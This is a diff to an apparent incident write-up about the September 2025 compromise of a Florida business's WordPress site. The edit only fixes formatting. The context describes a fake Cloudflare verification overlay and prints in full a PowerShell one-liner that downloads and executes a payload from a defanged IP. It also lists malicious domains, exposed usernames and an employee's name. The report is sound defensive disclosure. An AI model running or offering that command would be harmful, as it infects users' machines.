@@ -5,8 +5,8 @@
 On September 5, 2025, the Breakers FWB website ```(https://www.breakersfwb.com)``` was discovered to be compromised. Malicious JavaScript was injected into the site, in which visitors had a fake Cloudflare “verification” page overlaid on top of the actual website, which was hosted on ```ncloud.icu``` and dynamically loaded via a `<iframe>`. The fraudulent verification page attempted to trick users into executing a PowerShell command that would download further payloads from ```155.94.155.25```. The site directed the user to verify by pressing Win+R and Ctrl+V to paste ```powershell -w h -nop -c iex(iwr -Uri 155[.]94[.]155[.]25 -UseBasicParsing)``` copied to their clipboard.
 
 Investigation showed evidence of:
-- Injected code** calling external malicious domains (```getfix.win```, ```ncloud.icu```).  
-- Obfuscated JavaScript** redirectors inserted server-side.  
+- Injected code calling external malicious domains (```getfix.win```, ```ncloud.icu```).  
+- Obfuscated JavaScript redirectors inserted server-side.  
 - Exposed WordPress user accounts, including the default ```admin``` and employee accounts ```ethanwhited``` & ```barbara``` (Barbara Martens).  
 - Spam blog posts unrelated to The Breakers’ business, created Sept 3-4, 2025.  
 
